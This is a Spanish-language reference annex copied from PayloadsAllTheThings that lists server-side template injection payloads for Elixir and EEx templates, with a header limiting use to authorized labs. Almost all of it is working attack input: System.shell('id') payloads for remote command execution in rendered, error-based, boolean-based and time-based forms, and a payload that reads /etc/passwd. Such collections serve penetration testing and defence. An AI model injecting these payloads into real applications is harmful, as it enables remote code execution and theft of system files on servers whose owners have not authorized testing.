# Server-Side Template Injection (SSTI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Template Injection/Elixir.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección en plantillas del servidor - Elixir / Templating Libraries

### Variantes presentes en tablas o texto del apartado

```text
<%= %>
```

## 2. Inyección en plantillas del servidor - Elixir / Universal Payloads

```erlang
elem(System.shell("id"), 0) # Rendered RCE
[1, 2][elem(System.shell("id"), 0)] # Error-Based RCE
1/((elem(System.shell("id"), 1) == 0)&&1||0) # Boolean-Based RCE
elem(System.shell("id && sleep 5"), 0) # Time-Based RCE
```

## 3. EEx / EEx - Básicos injections

```erlang
<%= 7 * 7 %>
```

## 4. EEx / EEx - Retrieve /etc/passwd

```erlang
<%= File.read!("/etc/passwd") %>
```

## 5. EEx / EEx - Remote Ejecución de comandos

```erlang
<%= elem(System.shell("id"), 0) %> # Rendered RCE
<%= [1, 2][elem(System.shell("id"), 0)] %> # Error-Based RCE
<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %> # Boolean-Based RCE
<%= elem(System.shell("id && sleep 5"), 0) %> # Time-Based RCE
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
